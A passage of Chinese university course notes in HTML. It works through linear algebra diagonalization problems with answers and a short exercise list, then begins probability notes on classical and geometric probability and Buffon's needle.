<p>由此我们知道<span class="arithmatex">\(A\)</span>最多有两个特征值，因为0的代数重数（即作为<span class="arithmatex">\(n\)</span>次特征多项式的零点次数）必然大于等于其几何重数<span class="arithmatex">\(n-1\)</span>，当期代数重数为<span class="arithmatex">\(n-1\)</span>时可能还有一个一重特征值. 我们利用特征值之和等于<span class="arithmatex">\(A\)</span>的迹来找出可能的第二个特征值. 我们设<span class="arithmatex">\(\alpha=(a_1,a_2,\ldots,a_n)^\mathrm{T},\beta=(b_1,b_2,\ldots,b_n)^\mathrm{T}\)</span>，则<span class="arithmatex">\(A=\alpha\beta^\mathrm{T}=\begin{pmatrix}
        a_1b_1 &amp; a_1b_2 &amp; \cdots &amp; a_1b_n \\
        a_2b_1 &amp; a_2b_2 &amp; \cdots &amp; a_2b_n \\
        \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
        a_nb_1 &amp; a_nb_2 &amp; \cdots &amp; a_nb_n
    \end{pmatrix}\)</span>，
因此<span class="arithmatex">\(A\)</span>的迹为<span class="arithmatex">\(\sum\limits_{i=1}^na_ib_i=\alpha^\mathrm{T}\beta=\sum\limits_{i=1}^n\lambda_i\)</span>，其中<span class="arithmatex">\(\lambda_i\)</span>为<span class="arithmatex">\(A\)</span>的特征值. 若<span class="arithmatex">\(\alpha^\mathrm{T}\beta\neq 0\)</span>，则<span class="arithmatex">\(\lambda_i=0,\enspace i=1,\ldots,n-1\)</span>，<span class="arithmatex">\(\lambda_n=\alpha^\mathrm{T}\beta\)</span>. 若<span class="arithmatex">\(\alpha^\mathrm{T}\beta=0\)</span>，则<span class="arithmatex">\(A\)</span>的所有特征值均为0.</p>
<ul>
<li>由上一小问可知，若<span class="arithmatex">\(\alpha^\mathrm{T}\beta=0\)</span>即<span class="arithmatex">\(A\)</span>的全部特征值为0，因此只有一个<span class="arithmatex">\(n-1\)</span>维的特征子空间，故特征子空间直和不等于<span class="arithmatex">\(V\)</span>，故不可对角化.</li>
</ul>
<p>反之，若<span class="arithmatex">\(A\)</span>不可对角化，我们用反证法. 假设<span class="arithmatex">\(\alpha^\mathrm{T}\beta\neq 0\)</span>，则<span class="arithmatex">\(A\)</span>有两个特征值，一个为0，一个为<span class="arithmatex">\(\alpha^\mathrm{T}\beta\)</span>，因此<span class="arithmatex">\(A\)</span>有两个特征子空间，一个是0对应的<span class="arithmatex">\(n-1\)</span>维特征子空间，一个是<span class="arithmatex">\(\alpha^\mathrm{T}\beta\)</span>对应的一维特征子空间，因此<span class="arithmatex">\(V\)</span>可分解为两个特征子空间的直和，与<span class="arithmatex">\(A\)</span>不可对角化矛盾，因此<span class="arithmatex">\(\alpha^\mathrm{T}\beta=0\)</span>.</p>
</details>
</div>
<div class="admonition question">
<p class="admonition-title">幂零矩阵不可对角化</p>
<p>设<span class="arithmatex">\(A\)</span>为<span class="arithmatex">\(n\)</span>阶非零矩阵，且<span class="arithmatex">\(A^m=O\enspace(m\in\mathbf{N}_+,\enspace m&gt;1)\)</span>. 证明：<span class="arithmatex">\(A\)</span>不可对角化；</p>
<details class="answer">
<summary>Answer</summary>
<p>设<span class="arithmatex">\(\lambda\)</span>是<span class="arithmatex">\(A\)</span>的特征值，由题意<span class="arithmatex">\(\lambda^m=0\)</span>，即<span class="arithmatex">\(\lambda=0\)</span>，因此<span class="arithmatex">\(A\)</span>的所有特征值都为0. 但<span class="arithmatex">\(r(A)&gt;0\)</span>（因为<span class="arithmatex">\(A\)</span>不是零矩阵），因此0对应的特征子空间维数为<span class="arithmatex">\(n-r(A)&lt;n\)</span>，因此<span class="arithmatex">\(A\)</span>不可对角化.</p>
</details>
</div>
<div class="admonition question">
<p class="admonition-title">给出矩阵方程问对角化</p>
<ul>
<li>
<p>设<span class="arithmatex">\(A\)</span>为<span class="arithmatex">\(n\)</span>阶矩阵，且<span class="arithmatex">\(A^2=2A\)</span>. 证明：<span class="arithmatex">\(A\)</span>可对角化，并求出与之相似的对角矩阵（注：本题结论可推广到任意的<span class="arithmatex">\(A^2=kA\)</span>）；</p>
</li>
<li>
<p>设<span class="arithmatex">\(A\)</span>为二阶矩阵，非零向量<span class="arithmatex">\(\alpha\)</span>不是<span class="arithmatex">\(A\)</span>的特征向量，且<span class="arithmatex">\(A^2\alpha-3A\alpha+2\alpha=0\)</span>. 证明：<span class="arithmatex">\(\alpha\)</span>和<span class="arithmatex">\(A\alpha\)</span>线性无关且<span class="arithmatex">\(A\)</span>可对角化并求与<span class="arithmatex">\(A\)</span>相似的对角矩阵.</p>
</li>
</ul>
<details class="answer">
<summary>Answer</summary>
<p>1.
由题意<span class="arithmatex">\(A^2-2A=O\)</span>，因此<span class="arithmatex">\(A\)</span>的特征值就是方程<span class="arithmatex">\(\lambda^2-2\lambda=0\)</span>的解，即<span class="arithmatex">\(\lambda_1=0,\lambda_2=2\)</span>.</p>
<p>接下来我们需要说明0和2对应的特征子空间维数之和为<span class="arithmatex">\(n\)</span>，即<span class="arithmatex">\(\dim V_0+\dim V_2=n\)</span>，其中<span class="arithmatex">\(V_0\)</span>和<span class="arithmatex">\(V_2\)</span>分别为0和2对应的特征子空间. 事实上，由<span class="arithmatex">\(A^2=2A\)</span>可知<span class="arithmatex">\(A(A-2E)=O\)</span>，由知<span class="arithmatex">\(r(A)+r(A-2E)\leqslant n\)</span>，又根据秩不等式<span class="arithmatex">\(r(A)+r(B)\geqslant r(A+B)\)</span>，因此<span class="arithmatex">\(r(A)+r(A-2E)=r(A)+r(2E-A)\geqslant r(A+(2E-A))=r(2E)=n\)</span>. 综上可知，<span class="arithmatex">\(r(A)+r(A-2E)=n\)</span>.</p>
<p>实际上，<span class="arithmatex">\(V_0\)</span>就是<span class="arithmatex">\(AX=0\)</span>的解空间，<span class="arithmatex">\(V_2\)</span>就是<span class="arithmatex">\((A-2E)X=0\)</span>的解空间，因此<span class="arithmatex">\(\dim V_0=n-r(A),\dim V_2=n-r(A-2E)\)</span>，因此由<span class="arithmatex">\(r(A)+r(A-2E)=n\)</span>可知<span class="arithmatex">\(\dim V_0+\dim V_2=2n-n=n\)</span>，即0和2对应的特征子空间维数之和为<span class="arithmatex">\(n\)</span>，因此<span class="arithmatex">\(A\)</span>可对角化.</p>
<p>由于可对角化矩阵代数重数等于几何重数，因此特征值0对应的代数重数为<span class="arithmatex">\(n-r(A)\)</span>，特征值2对应的代数重数为<span class="arithmatex">\(r(A)\)</span>，因此我们可以得到与<span class="arithmatex">\(A\)</span>相似的对角矩阵为<span class="arithmatex">\(\mathbf{diag}(0,\ldots,0,2,\ldots,2)\)</span>，其中0的个数为<span class="arithmatex">\(n-r(A)\)</span>，2的个数为<span class="arithmatex">\(r(A)\)</span>.</p>
<p>2.
反证法，假设<span class="arithmatex">\(\alpha\)</span>和<span class="arithmatex">\(A\alpha\)</span>线性相关，则存在不全为零的常数<span class="arithmatex">\(k_1,k_2\)</span>使得<span class="arithmatex">\(k_1\alpha+k_2A\alpha=0\)</span>. 显然<span class="arithmatex">\(k_2\neq 0\)</span>，因为假设<span class="arithmatex">\(k_2=0\)</span>，则<span class="arithmatex">\(k_1\alpha=0\)</span>，由于<span class="arithmatex">\(\alpha\neq 0\)</span>，故<span class="arithmatex">\(k_1=0\)</span>，这与<span class="arithmatex">\(k_1,k_2\)</span>不全为0矛盾. 因此我们有<span class="arithmatex">\(A\alpha=-\dfrac{k_1}{k_2}\alpha\)</span>，即<span class="arithmatex">\(\alpha\)</span>是<span class="arithmatex">\(A\)</span>的特征向量，这与题设矛盾，因此<span class="arithmatex">\(\alpha\)</span>和<span class="arithmatex">\(A\alpha\)</span>线性无关.</p>
<p>由题意，<span class="arithmatex">\(A^2\alpha-3A\alpha+2\alpha=0\)</span>，即<span class="arithmatex">\((A^2-3A+2E)\alpha=0\)</span>，又<span class="arithmatex">\(\alpha\neq 0\)</span>，因此<span class="arithmatex">\(A^2-3A+2E\)</span>不可逆，从而<span class="arithmatex">\(|A^2-3A+2E|=|E-A||2E-A|=0\)</span>，故<span class="arithmatex">\(|E-A|=0\)</span>或<span class="arithmatex">\(|2E-A|=0\)</span>.</p>
<p>若<span class="arithmatex">\(|E-A|\neq 0\)</span>，则<span class="arithmatex">\(E-A\)</span>可逆，因此<span class="arithmatex">\((A^2-3A+2E)\alpha=(E-A)((2E-A)\alpha)=0\)</span>可知<span class="arithmatex">\((2E-A)\alpha=0\)</span>，即<span class="arithmatex">\(A\alpha=2\alpha\)</span>，故<span class="arithmatex">\(\alpha\)</span>为<span class="arithmatex">\(A\)</span>的特征向量，这与条件矛盾，因此<span class="arithmatex">\(|E-A|=0\)</span>. 同理，<span class="arithmatex">\(|2E-A|=0\)</span>，因此<span class="arithmatex">\(A\)</span>有两个特征值1和2，又<span class="arithmatex">\(A\)</span>是2阶矩阵，因此由\autoref{cor:可对角化必要条件} 可知<span class="arithmatex">\(A\)</span>一定可对角化，且对角矩阵为<span class="arithmatex">\(\begin{pmatrix}
              1 &amp; 0 \\
              0 &amp; 2
          \end{pmatrix}\)</span>.</p>
</details>
</div>
<div class="admonition question">
<p class="admonition-title">若当矩阵不可对角化</p>
<p>证明<span class="arithmatex">\(r\)</span>阶上三角矩阵<span class="arithmatex">\((r&gt;1)\)</span></p>
<div class="arithmatex">\[J_0=\begin{pmatrix}
        \lambda_0 &amp; 1         &amp;        &amp;           \\
                  &amp; \lambda_0 &amp; \ddots &amp;           \\
                  &amp;           &amp; \ddots &amp; 1         \\
                  &amp;           &amp;        &amp; \lambda_0
    \end{pmatrix}\]</div>
<p>不与对角阵相似.</p>
<details class="answer">
<summary>Answer</summary>
<p>首先求出特征多项式为<span class="arithmatex">\(f(\lambda)=|\lambda E-J_0|=(\lambda-\lambda_0)^r\)</span>，因此<span class="arithmatex">\(J_0\)</span>只有一个特征值<span class="arithmatex">\(\lambda_0\)</span>，且代数重数为<span class="arithmatex">\(r\)</span>.</p>
<p>接下来求几何重数，即<span class="arithmatex">\(J_0X=\lambda_0X\)</span>的解空间维数，即<span class="arithmatex">\((\lambda_0 E-J_0)X=O\)</span>的解空间维数，事实上由于<span class="arithmatex">\(r(\lambda_0 E-J_0)=r-1\)</span>，因此解空间维数为<span class="arithmatex">\(r-(r-1)=1\)</span>，即几何重数为<span class="arithmatex">\(1&lt;r\)</span>，因此不可对角化</p>
</details>
</div>
<div class="admonition question">
<p class="admonition-title">AB=BA</p>
<p>设 <span class="arithmatex">\( A, B \in M_n(\mathbf{F}) \)</span>, <span class="arithmatex">\( AB = BA \)</span>, 证明：</p>
<ol>
<li>若 <span class="arithmatex">\( X \)</span> 是矩阵 <span class="arithmatex">\( A \)</span> 属于特征值 <span class="arithmatex">\( \lambda_0 \)</span> 的特征向量，则 <span class="arithmatex">\( BX \in V_{\lambda_0} \)</span>.</li>
<li><span class="arithmatex">\( A \)</span> 和 <span class="arithmatex">\( B \)</span> 至少有一个共同的特征向量.</li>
<li><span class="arithmatex">\( A \)</span> 有 <span class="arithmatex">\( n \)</span> 个不同的特征值则</li>
<li><span class="arithmatex">\( AB = BA \)</span> 当且仅当 <span class="arithmatex">\( A \)</span> 的特征向量也是 <span class="arithmatex">\( B \)</span> 的特征向量.</li>
<li>存在次数小于等于 <span class="arithmatex">\( n-1 \)</span> 的多项式 <span class="arithmatex">\( f(x) \)</span> 使得 <span class="arithmatex">\( B = f(A) \)</span>.</li>
<li>若 <span class="arithmatex">\( A, B \)</span> 均可对角化，则对角化的过渡矩阵可以相同（同时对角化）.</li>
<li><span class="arithmatex">\( A, B \)</span> 可以同时上三角化，即存在可逆矩阵 <span class="arithmatex">\( P \)</span> 使得 <span class="arithmatex">\( P^{-1}AP \)</span> 和 <span class="arithmatex">\( P^{-1}BP \)</span> 都是上三角矩阵.</li>
</ol>
<p>设 <span class="arithmatex">\( n \)</span> 阶方阵 <span class="arithmatex">\( A \)</span> 和 <span class="arithmatex">\( B \)</span> 都可对角化，并且它们有相同的特征子空间（但不一定有相同的特征值），证明 <span class="arithmatex">\( AB = BA \)</span>.</p>
</div>
<h2 id="note-la-eigenvalue-_11">习题<a class="headerlink" href="#note-la-eigenvalue-_11" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>设<span class="arithmatex">\(A\)</span>为n阶复方阵,<span class="arithmatex">\(P\)</span>为可逆矩阵。证明<span class="arithmatex">\(tr(A)=tr(P^{-1}AP)\)</span></p>
</li>
<li>
<p>已知<span class="arithmatex">\(A\)</span>为3阶矩阵，特征值为1，2，3;求<span class="arithmatex">\(|A^2+4A+E|\)</span></p>
</li>
<li>
<p>证明:若<span class="arithmatex">\(A^2-(\lambda_1+\lambda_2)A+\lambda_1 \lambda_2 E = O,\lambda_1 \neq \lambda_2\)</span>,则<span class="arithmatex">\(A\)</span>可对角化(Hint:矩阵方程可对角化条件),并判断以下说法说法哪一个正确</p>
<ul>
<li><span class="arithmatex">\(A\)</span>的特征值兼有一定兼有<span class="arithmatex">\(\lambda_1\)</span>和<span class="arithmatex">\(\lambda_2\)</span></li>
<li><span class="arithmatex">\(A\)</span>可对角化，但其特征值不一定同时有<span class="arithmatex">\(\lambda_1\)</span>和<span class="arithmatex">\(\lambda_2\)</span>,可能为<span class="arithmatex">\(\lambda_1\)</span>和<span class="arithmatex">\(\lambda_1\)</span>,<span class="arithmatex">\(\lambda_2\)</span>和<span class="arithmatex">\(\lambda_2\)</span>,或者<span class="arithmatex">\(\lambda_1\)</span>和<span class="arithmatex">\(\lambda_2\)</span></li>
</ul>
</li>
<li>
<p>证明秩为1的向量可以写为<span class="arithmatex">\(\alpha^\mathrm{T}\beta\)</span>,(回忆相抵标准型~)</p>
</li>
<li>
<p>设 <span class="arithmatex">\(\alpha\)</span> 为 <span class="arithmatex">\(n\)</span> 维实向量且 <span class="arithmatex">\(\alpha^\mathrm{T} \alpha =1\)</span>,求矩阵<span class="arithmatex">\(I-\alpha \alpha^\mathrm{T}\)</span>的特征值(Hint: 特征多项式展开)</p>
</li>
<li>
<p><span class="arithmatex">\(A,B\)</span>都是<span class="arithmatex">\(n\)</span>阶矩阵，证明<span class="arithmatex">\(AB+B\)</span>与<span class="arithmatex">\(BA+B\)</span>有相同的特征值.(Hint:证明相似)</p>
</li>
<li>
<p>判断并证明：<span class="arithmatex">\(n\)</span>阶方阵<span class="arithmatex">\(A\)</span>满足<span class="arithmatex">\(A^2-5A+5E_n=0\)</span>，则对于所有的有理数<span class="arithmatex">\(r\)</span>,有<span class="arithmatex">\(A+rE_n\)</span>可逆</p>
</li>
<li>
<p>记 </p>
</li>
</ul>
<div class="arithmatex">\[
    X = \left\{ \begin{pmatrix} a_{11} &amp; a_{12} &amp; a_{13} \\ a_{21} &amp; a_{22} &amp; a_{23} \\ a_{31} &amp; a_{32} &amp; a_{33} \end{pmatrix} \in M_{3 \times 3}(\mathbb{R}) \ \middle| \ \sum_{j=1}^{3} a_{1j} = \sum_{j=1}^{3} a_{2j} = \sum_{j=1}^{3} a_{3j} = \sum_{i=1}^{3} a_{ij} \right\}.
\]</div>
<p>证明：</p>
<ol>
<li><span class="arithmatex">\(X\)</span> 是 <span class="arithmatex">\(M_{3 \times 3}(\mathbb{R})\)</span> 的一个子空间，并求该子空间的维数；</li>
<li>对任意可逆矩阵 <span class="arithmatex">\(A \in X\)</span>，<span class="arithmatex">\((1, 1, 1)^\mathrm{T}\)</span> 是 <span class="arithmatex">\(A\)</span> 和 <span class="arithmatex">\(A^{-1}\)</span> 的特征向量；</li>
<li>对任意可逆矩阵 <span class="arithmatex">\(A \in X\)</span>，<span class="arithmatex">\(A^{-1} \in X\)</span>。</li>
</ol></section></section>
                    <section class='print-page md-section' id='section-2-3-2' heading-number='2.3.2'>
                        <h1>概率论<a class='headerlink' href='#section-2-3-2' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-probability" heading-number="2.3.2.1"><note-probability-h1 id="note-probability-h">概率论(H)<a class="headerlink" href="#note-probability-h" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 50 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<blockquote>
<p>授课:<a href="https://baike.baidu.com/item/%E8%8B%8F%E4%B8%AD%E6%A0%B9/10812386">苏中根</a></p>
</blockquote>
<p>"同学们我们的雷达点名已经开始"</p>
<div class="toc-container">
    <div class="toc-header">目录</div>
    <ul class="toc">
        <li><a href="#note-probability-others">其它知识</a></li>
        <li><a href="#note-probability-first">事件与概率</a></li>
        <li><a href="#note-probability-second">分布列与分布函数</a></li>
        <li><a href="#note-probability-third">数字特征</a></li>
        <li><a href="#note-probability-fourth">极限定理</a></li>
    </ul>
</div></section><section class="print-page" id="note-probability-first" heading-number="2.3.2.2"><h1 id="note-probability-first-_1">事件及其概率<a class="headerlink" href="#note-probability-first-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1370 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 5 分钟</p>
</div>
<div class="admonition quote">
<p class="admonition-title">Quote</p>
<p>本章节部分内容参考了<a href="https://zhoutimemachine.github.io/note/courses/probability/">周学长的blog</a></p>
</div>
<h2 id="note-probability-first-_2">随机现象域统计规律性<a class="headerlink" href="#note-probability-first-_2" title="Permanent link">&para;</a></h2>
<h3 id="note-probability-first-_3">随机现象<a class="headerlink" href="#note-probability-first-_3" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>确定性现象:可以确定在一定条件下某种现象必定发生或者必定不会发生</p>
<ul>
<li>必然事件:一定会发生，例如太阳一定会东升西落</li>
<li>不可能事件:一定不会发生，例如家猪会飞上天  </li>
</ul>
</li>
<li>
<p>随机现象:在一定条件下，某种事件可能发生也可能不发生</p>
</li>
<li>
<p>随机试验(random experiment):对于随机现象，在基本相同的条件下，重复进行试验或者观察，可能出现不同的结果(但是结果的所有可能是知道的，不知道出现哪一种可能)</p>
</li>
<li>
<p>随机试验的结果称为随机事件(random event),简称事件</p>
</li>
</ul>
<h3 id="note-probability-first-_4">概率的统计定义<a class="headerlink" href="#note-probability-first-_4" title="Permanent link">&para;</a></h3>
<p>相同条件下重复<span class="arithmatex">\(N\)</span>次试验,各次试验互不影响,事件<span class="arithmatex">\(A\)</span>出现的次数(频数)<span class="arithmatex">\(n\)</span>,称</p>
<div class="arithmatex">\[ F_N(A)=\dfrac{n}{N} \]</div>
<p>为 <span class="arithmatex">\(A\)</span> 在 <span class="arithmatex">\(N\)</span> 次试验中出现的 <strong>频率</strong> (frequency)</p>
<p><span class="arithmatex">\(N\)</span>足够大时频率会趋向于一个常数，称为 <strong>概率</strong> (probability),记为<span class="arithmatex">\(P(A)\)</span>,概率可以表示事件<span class="arithmatex">\(A\)</span>在一次试验中发生的可能性的大小</p>
<div class="admonition note">
<p class="admonition-title">概率和频率的特性</p>
<ol>
<li>
<p>非负性：<span class="arithmatex">\(\forall A\in \mathcal{F},P(A)\geqslant 0\)</span></p>
</li>
<li>
<p>规范性：<span class="arithmatex">\(P(\Omega)=1\)</span></p>
</li>
<li>
<p>可列可加性：<span class="arithmatex">\(A_i\cap A_j=\emptyset, i\neq j\)</span> (即 <span class="arithmatex">\(A_1,\cdots, A_n, \cdots\)</span> 为两两不相容的事件)</p>
</li>
</ol>
<div class="arithmatex">\[
    P\left(\sum_{n=1}^\infty A_n\right)=\sum_{n=1}^\infty P(A_n)
\]</div>
</div>
<h2 id="note-probability-first-_5">古典概型<a class="headerlink" href="#note-probability-first-_5" title="Permanent link">&para;</a></h2>
<h3 id="note-probability-first-_6">样本空间和样本点<a class="headerlink" href="#note-probability-first-_6" title="Permanent link">&para;</a></h3>
<p>样本空间和样本点是概率论和统计学中的两个基本概念。</p>
<p><strong>样本空间(Sample Space)</strong></p>
<p>样本空间是指在一次试验或随机事件中，所有可能的结果的集合。用符号 <span class="arithmatex">\( S \)</span> 或 <span class="arithmatex">\( \Omega \)</span> 表示。例如：</p>
<ul>
<li><strong>掷一枚硬币</strong>：样本空间是硬币的所有可能结果，记作 <span class="arithmatex">\( S = \{ \text{正面}, \text{反面} \} \)</span> 或 <span class="arithmatex">\( S = \{H, T\} \)</span>。</li>
<li><strong>掷一颗骰子</strong>：样本空间是骰子的所有可能结果，记作 <span class="arithmatex">\( S = \{1, 2, 3, 4, 5, 6\} \)</span>。</li>
</ul>
<p><strong>样本点(Sample Point)</strong></p>
<p>样本点是样本空间中的一个元素，表示一次试验的一个可能结果。样本点是样本空间的一个具体结果。例如：</p>
<ul>
<li>在掷一枚硬币的试验中，样本空间为 <span class="arithmatex">\( S = \{H, T\} \)</span>，其中 <span class="arithmatex">\( H \)</span> 和 <span class="arithmatex">\( T \)</span> 就是样本点。</li>
<li>
<p>在掷一颗骰子的试验中，样本空间为 <span class="arithmatex">\( S = \{1, 2, 3, 4, 5, 6\} \)</span>，其中 <span class="arithmatex">\( 1, 2, 3, 4, 5, 6 \)</span> 都是样本点。</p>
</li>
<li>
<p><strong>样本空间</strong> 是所有可能结果的集合。</p>
</li>
<li>
<p><strong>样本点</strong> 是样本空间中的一个单一结果。 </p>
</li>
</ul>
<h3 id="note-probability-first-_7">古典概型<a class="headerlink" href="#note-probability-first-_7" title="Permanent link">&para;</a></h3>
<div class="admonition info">
<p class="admonition-title">古典概型的特征</p>
<ol>
<li>样本空间中样本点有限，<span class="arithmatex">\(\Omega=\{\omega_1,\omega_2, \cdots, \omega_n\}\)</span></li>
<li>各基本事件等可能，即 <span class="arithmatex">\(P(\omega)=\frac 1n\)</span></li>
</ol>
</div>
<p>古典概率(classical probability)的计算：</p>
<div class="arithmatex">\[
    P(A)=\frac m n=\frac{A\text{ 包含的样本点数}}{\text{样本空间中样本点总数}}
\]</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>有 <span class="arithmatex">\(n\)</span> 个球，<span class="arithmatex">\(N\)</span> 个格子 (<span class="arithmatex">\(n \leqslant N\)</span>)，球与格子都是可以区分的。每个球落在各格子的概率相同 (设格子足够大，可以容纳任意多个球)。将这 <span class="arithmatex">\(n\)</span> 个球随机地放入 <span class="arithmatex">\(N\)</span> 个格子，求：</p>
<ol>
<li><strong>指定的 <span class="arithmatex">\(n\)</span> 格各有一球的概率；</strong></li>
<li><strong>有 <span class="arithmatex">\(n\)</span> 格各有一球的概率。</strong></li>
</ol>
<p>把球编号为 <span class="arithmatex">\(1 \sim n\)</span>，<span class="arithmatex">\(n\)</span> 个球的每一种放法是一个样本点，这属于古典概型。由于一个格子可容纳任意多球，样本点总数应该是从 <span class="arithmatex">\(N\)</span> 个中取 <span class="arithmatex">\(n\)</span> 个的重复排列数 <span class="arithmatex">\(N^n\)</span>。</p>
<ol>
<li>记 <span class="arithmatex">\(A = \{\text{指定的 } n \text{ 格各有一球}\}\)</span>，它包含的样本点数是指定的 <span class="arithmatex">\(n\)</span> 格中 <span class="arithmatex">\(n\)</span> 个球的全排列数 <span class="arithmatex">\(n!\)</span>，故：</li>
</ol>
<div class="arithmatex">\[
P(A) = \frac{n!}{N^n}.
\]</div>
<ol>
<li>记 <span class="arithmatex">\(B = \{\text{有 } n \text{ 格各有一球}\}\)</span>，它所包含的样本点数是 <span class="arithmatex">\(N\)</span> 格中任取 <span class="arithmatex">\(n\)</span> 格的全排列数 <span class="arithmatex">\(P_{N}^{n}\)</span>，故：</li>
</ol>
<div class="arithmatex">\[
P(B) = \frac{P_{N}^{n}}{N^n} = \frac{N(N-1) \cdots (N-n+1)}{N^n}
= \left( 1 - \frac{1}{N} \right) \left( 1 - \frac{2}{N} \right) \cdots \left( 1 - \frac{n-1}{N} \right).
\]</div>
<p>注意到 <span class="arithmatex">\(\log(1 - x) = -x + O(x^2), , x \to 0\)</span>。我们有：</p>
<div class="arithmatex">\[
\log \left( 1 - \frac{1}{N} \right) + \log \left( 1 - \frac{2}{N} \right) + \cdots + \log \left( 1 - \frac{n-1}{N} \right)
= \sum_{k=1}^{n-1} \log \left( 1 - \frac{k}{N} \right)
= - \sum_{k=1}^{n-1} \frac{k}{N} + O \left( \frac{n^3}{N^2} \right).
\]</div>
<p>故当 <span class="arithmatex">\(N\)</span> 比 <span class="arithmatex">\(n\)</span> 大得多时，我们可以采用近似计算公式：</p>
<div class="arithmatex">\[
P(B) \approx \exp \left\{ -\frac{n(n-1)}{2N} \right\}.
\]</div>
</div>
<h3 id="note-probability-first-_8">几何概型<a class="headerlink" href="#note-probability-first-_8" title="Permanent link">&para;</a></h3>
<div class="admonition info">
<p class="admonition-title">几何概型的特征</p>
<ol>
<li>样本空间中样本点无限</li>
<li>样本点落在等测度(长度、面积、体积...)区域的概率相等</li>
</ol>
</div>
<p>几何概型的计算：</p>
<div class="arithmatex">\[
    P(A_g)=\frac{g\text{ 的测度}}{\Omega\text{ 的测度}}
\]</div>
<p><span class="arithmatex">\(A_g=\{\text{任取样本点，位于区域 }g\in\Omega\text{ 的概率}\}\)</span></p>
<div class="admonition example">
<p class="admonition-title">蒲丰 (Buffon) 投针问题</p>
<p>平面上画很多平行线，间距为 <span class="arithmatex">\(a\)</span>。向此平面投掷长为 <span class="arithmatex">\(l \, (l &lt; a)\)</span> 的针，求此针与任一平行线相交的概率</p>
<p>以针的任一位置为样本点，它可以由两个参数决定：针的中点与最近的平行线之间的距离 <span class="arithmatex">\(x\)</span>，针与平行线的夹角 <span class="arithmatex">\(\varphi\)</span>。</p>
<p>样本空间：</p>
<div class="arithmatex">\[
\Omega = \{(\varphi, x) \mid 0 \leqslant \varphi \leqslant \pi, \, 0 \leqslant x \leqslant \frac{a}{2}\}
\]</div>
<p>为一矩形。针与平行线相交的区域是：</p>
<div class="arithmatex">\[
g = \{(\varphi, x) \mid x \leqslant \frac{l}{2} \sin \varphi\} \quad (\text{见图}).
\]</div>
<p><img alt="alt text" src="../NOTE/Probability/image.png" /></p>
<p>所求概率是：</p>
<div class="arithmatex">\[
P = \frac{g \, \text{的面积}}{\Omega \, \text{的面积}} = \frac{\int_0^{\pi} \frac{l}{2} \sin \varphi \, d\varphi}{\pi (a/2)} = \frac{2l}{a\pi}.
\]</div>
<div class="arithmatex">\[
\text{左图：} \quad a \, \text{为平行线间距，} \, l \, \text{为针长，} \, x \, \text{为距离，} \, \varphi \, \text{为角度}
\]</div>
<div class="arithmatex">\[
\text{右图：} \quad x = \frac{l}{2} \sin \varphi
\]</div>
<p>因为概率 <span class="arithmatex">\(P\)</span> 可以用多次重复试验的频率来近似，所以可以得到它的近似值。方法是重复投针 <span class="arithmatex">\(N\)</span> 次(或一次投针若干枚，总计 <span class="arithmatex">\(N\)</span> 枚)，统计与平行线相交的枚数 <span class="arithmatex">\(n\)</span>，则 <span class="arithmatex">\(P \approx n/N\)</span>。</p>
<p>又因为 <span class="arithmatex">\(l \leqslant a\)</span> 且可精确测量，故从 <span class="arithmatex">\(2l/a\pi \approx n/N\)</span> 可解得 <span class="arithmatex">\(\pi \approx 2lN/an\)</span>。历史上有人不止一次做过这个试验，做得最好的一个投掷了 3408 次，算得 <span class="arithmatex">\(\pi \approx 3.1415929\)</span>，其精确度已经达到小数点后第六位。</p>
<p>设计一个随机试验，通过大量重复试验得到某种结果，以确定我们感兴趣的某个量，由此而发展的蒙特卡洛(Monte-Carlo)方法为这种计算提供了一种途径。随着电子计算机的发展，基于随机试验法的内容，得使这种方法变得非常有效。</p>
</div>
<h2 id="note-probability-first-_9">概率的公理化定义<a class="headerlink" href="#note-probability-first-_9" title="Permanent link">&para;</a></h2>
<p>把样本空间看做全集，事件看作包含样本点的集合,可以采用集合论的方法来研究事件</p>
<p>有事件之间的中的</p>
